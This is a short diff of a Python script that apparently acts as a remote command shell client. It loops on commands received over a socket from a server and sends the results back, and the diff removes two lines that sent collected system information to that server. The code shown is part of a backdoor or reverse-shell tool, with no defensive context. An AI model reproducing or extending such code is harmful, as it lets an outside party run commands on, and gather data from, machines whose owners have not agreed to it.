@@ -23,8 +23,6 @@ print('[*] Server:' ,msg)
 while True:
     cmd = s.recv(1024).decode()
     print(f'[+] Recv Command: {cmd}')
-    system_data = get_system_info()
-    s.send(system_data.encode())
     if cmd.lower() in ['q', 'quit', 'exit', 'close']:
         break
 
@@ -39,4 +37,5 @@ while True:
         s.send(res)
 
 s.close()
+
 
